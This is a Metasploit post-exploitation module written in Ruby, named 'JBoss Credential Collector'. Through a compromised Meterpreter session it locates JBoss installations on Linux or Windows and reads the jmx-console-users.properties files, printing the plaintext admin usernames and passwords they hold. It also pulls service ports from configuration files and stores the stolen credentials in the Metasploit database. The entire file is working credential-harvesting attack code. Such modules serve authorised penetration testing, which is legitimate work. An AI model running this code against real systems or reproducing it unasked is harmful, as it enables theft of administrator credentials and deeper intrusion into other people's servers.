##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'nokogiri'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'JBoss Credential Collector',
        'Description' => %q{
          This module can be used to extract the JBoss admin passwords for version 4, 5 and 6.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Koen Riepe (koen.riepe@fox-it.com)' ],
        'Platform' => [ 'linux', 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
  end

  def report_creds(user, pass, port)
    return if user.empty? || pass.empty?

    # Assemble data about the credential objects we will be creating
    credential_data = {
      origin_type: :session,
      post_reference_name: fullname,
      private_data: pass,
      private_type: :password,
      session_id: session_db_id,
      username: user,
      workspace_id: myworkspace_id
    }

    credential_core = create_credential(credential_data)

    if !port.is_a?(Integer)
      print_error('Failed to detect port, defaulting to 8080 for creds database')
      port = 8080
    end

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED,
      address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
      port: port,
      service_name: 'jboss',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
    create_credential_login(login_data)
  end

  def getpw(file, ports)
    i = 0
    file.each do |pwfile|
      begin
        print_status("Getting passwords from: #{pwfile}")
        lines = read_file(pwfile).split("\n")
      rescue StandardError
        print_error("Cannot open #{pwfile}, you probably do not have permissions to open the file.")
        next
      end
      for line in lines
        next if line.include? '#'

        creds = line.split('=')
        print_good("Credentials found - Username: #{creds[0]} Password: #{creds[1]}")
        report_creds(creds[0], creds[1], ports[i])
      end
      i += 1
    end
  end

  def getversion(array)
    i = 0
    version = 'NONE'
    results = []
    while i < array.count
      downcase = array[i].downcase
      if downcase.include? 'jboss'
        begin
          file = read_file(array[i])
        rescue StandardError
          print_error("Cannot open #{array[i]}, you probably do not have permissions to open the file.")
          next
        end
        xml_doc = Nokogiri::XML(file)
        xml_doc.xpath('//jar-versions//jar').each do |node|
          if node['name'] == 'jbossweb.jar'
            version = node['specVersion'][0]
            results.push(version)
          end
        end
      end
      if version != 'NONE'
        print_status("Found a JBoss installation version: #{version}")
        home = readhome(cmd_exec('printenv').split("\n"))
        pwfiles = getpwfiles(cmd_exec('locate jmx-console-users.properties').split("\n"), home, version)
        listenports = getports(version)
        getpw(pwfiles, listenports)
      end
      i += 1
    end
  end

  def wingetversion(array, home)
    i = 0
    version = 'NONE'
    results = []
    while i < array.count
      downcase = array[i].downcase
      if downcase.include? 'jboss'
        file = read_file(array[i])
        xml_doc = Nokogiri::XML(file)
        xml_doc.xpath('//jar-versions//jar').each do |node|
          if node['name'] == 'jbossweb.jar'
            version = node['specVersion'][0]
            results.push(version)
          end
        end
      end
      if version != 'NONE'
        print_status("Found a JBoss installation version: #{version}")
        instances = wingetinstances(home, version)
        pwfiles = winpwfiles(instances)
        listenports = wingetport(instances)
        getpw(pwfiles, listenports)
      end
      i += 1
    end
  end

  def readhome(array)
    home = ''
    array.each do |item|
      if item.include? 'JBOSS_HOME'
        home = item.split('JBOSS_HOME=')[1]
      end
    end
    return home
  end

  def getpwfiles(array, home, version)
    pwfiles = []
    array.each do |location|
      if location.include?(home && version)
        pwfiles.push(location)
      end
    end
    return pwfiles
  end

  def getports(version)
    type1 = cmd_exec('locate bindings-jboss-beans.xml').split("\n")
    type2 = cmd_exec('locate jboss-web.deployer/server.xml').split("\n")
    port = []
    type1.each do |file1|
      next unless file1 && file1.include?(version)

      print_status("Attempting to extract JBoss service ports from: #{file1}")
      begin
        file1_read = read_file(file1).split("\n")
      rescue StandardError
        print_error("Cannot open #{file1}, you probably do not have permissions to open the file.")
        next
      end
      parse = false
      portfound = false
      file1_read.each do |line|
        if line.strip.include? 'deploy/httpha-invoker.sar'
          parse = true
        elsif (line.strip == '</bean>') && portfound
          parse = false
        elsif parse && line.include?('<property name="port">')
          portnr = line.split('<property name="port">')[1].split('<')[0].to_i
          port.push(portnr)
          portfound = true
          print_good("JBoss port found: #{portnr}")
        end
      end
    end

    type2.each do |file2|
      next unless file2 && file2.include?(version)

      print_status("Attempting to extract JBoss service ports from: #{file2}")
      begin
        xml2 = Nokogiri::XML(read_file(file2))
      rescue StandardError
        print_error("Cannot open #{file2}, you probably do not have permissions to open the file.")
        next
      end
      xml2.xpath('//Server//Connector').each do |connector|
        next unless connector['protocol'].include? 'HTTP'

        portnr = connector['port'].to_i
        port.push(portnr)
        print_good("JBoss port found: #{portnr}")
        break
      end
    end
    return port
  end

  def gathernix
    print_status('Unix OS detected, attempting to locate JBoss services')
    getversion(cmd_exec('locate jar-versions.xml').split("\n"))
  end

  def winhome
    home = []
    exec = cmd_exec('WMIC PROCESS get Caption,Commandline').split("\n")
    exec.each do |line|
      next unless line.downcase.include?('java.exe') && line.downcase.include?('jboss')

      print_status('JBoss service found')
      parse = line.split('-classpath "')[1].split('\\bin\\')[0]
      if parse[0] == ';'
        home.push(parse.split(';')[1])
      else
        home.push(parse)
      end
    end
    return home
  end

  def wingetinstances(home, version)
    instances = []
    instance_location = "#{home}\\server"
    exec = cmd_exec("cmd /c dir #{instance_location}").split("\n")
    exec.each do |instance|
      next unless instance.split('<DIR>')[1] && ((!instance.split('<DIR>')[1].strip.include? '.') && (!instance.split('<DIR>')[1].strip.include? '..'))

      instance_path = "#{home}\\server\\#{instance.split('<DIR>')[1].strip}"
      if instance_path.include? version
        instances.push(instance_path)
      end
    end
    return instances
  end

  def winpwfiles(instances)
    files = []
    instances.each do |seed|
      file_path = "#{seed}\\conf\\props\\jmx-console-users.properties"
      if exist?(file_path)
        files.push(file_path)
      end
    end
    return files
  end

  def wingetport(instances)
    port = []
    instances.each do |seed|
      path1 = "#{seed}\\conf\\bindingservice.beans\\META-INF\\bindings-jboss-beans.xml"
      path2 = "#{seed}\\deploy\\jboss-web.deployer\\server.xml"

      if exist?(path1)
        file1 = read_file("#{seed}\\conf\\bindingservice.beans\\META-INF\\bindings-jboss-beans.xml").split("\n")
      end

      if exist?(path2)
        file2 = read_file("#{seed}\\deploy\\jboss-web.deployer\\server.xml")
      end

      if file1
        print_status("Attempting to extract JBoss service ports from: #{seed}\\conf\\bindingservice.beans\\META-INF\\bindings-jboss-beans.xml")
        parse = false
        portfound = false
        file1.each do |line|
          if line.strip.include? 'deploy/httpha-invoker.sar'
            parse = true
          elsif (line.strip == '</bean>') && portfound
            parse = false
          elsif parse && line.include?('<property name="port">')
            portnr = line.split('<property name="port">')[1].split('<')[0].to_i
            port.push(portnr)
            portfound = true
            print_good("JBoss port found: #{portnr}")
          end
        end
      end

      next unless file2

      print_status("Attempting to extract JBoss service ports from: #{seed}\\deploy\\jboss-web.deployer\\server.xml")
      xml2 = Nokogiri::XML(file2)
      xml2.xpath('//Server//Connector').each do |connector|
        next unless connector['protocol'].include? 'HTTP'

        portnr = connector['port'].to_i
        port.push(portnr)
        print_good("JBoss port found: #{portnr}")
        break
      end
    end
    return port
  end

  def gatherwin
    print_status('Windows OS detected, enumerating services')
    home_array = winhome

    if home_array.empty?
      print_status('No JBoss service has been found')
      return
    end

    home_array.each do |home|
      version_file = []
      version_file.push("#{home}\\jar-versions.xml")
      wingetversion(version_file, home)
    end
  end

  def run
    if sysinfo['OS'].include?('Windows')
      gatherwin
    else
      gathernix
    end
  rescue StandardError
    print_error('sysinfo function not available, you are probably using a wrong meterpreter.')
  end
end
